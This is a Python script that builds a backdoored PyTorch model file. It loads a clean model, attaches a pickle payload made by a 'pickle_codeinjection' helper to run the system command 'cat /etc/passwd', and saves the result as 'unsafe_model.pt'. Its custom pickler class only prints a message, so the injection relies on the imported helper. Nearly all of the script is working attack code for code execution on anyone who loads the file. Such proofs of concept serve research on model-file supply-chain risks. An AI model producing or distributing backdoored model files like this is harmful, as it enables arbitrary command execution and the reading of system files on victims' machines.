import torch
import os
import pickle
from pickle_codeinjection import get_payload

model_directory = "PyTorchModels"
safe_model_path = os.path.join(model_directory, "safe_model.pt")
unsafe_model_path = os.path.join(model_directory, "unsafe_model.pt")

# Define malicious payload
payload = get_payload("system", "cat /etc/passwd")

# Custom Pickle module
def make_pickle_inject_module():
    class InjectingPickler(pickle.Pickler):
        def save(self, obj):
            print("Saving object (possibly with payload)...")
            super().save(obj)

    class FakePickleModule:
        __name__ = "fake_pickle"
        Pickler = InjectingPickler

    return FakePickleModule()

# Load safe model
model = torch.load(safe_model_path)

# Inject malicious payload
model.payload = payload

# Save unsafe model
torch.save(
    model,
    f=unsafe_model_path,
    pickle_module=make_pickle_inject_module(),
)

print(f"[+] Backdoored model written to {unsafe_model_path}")
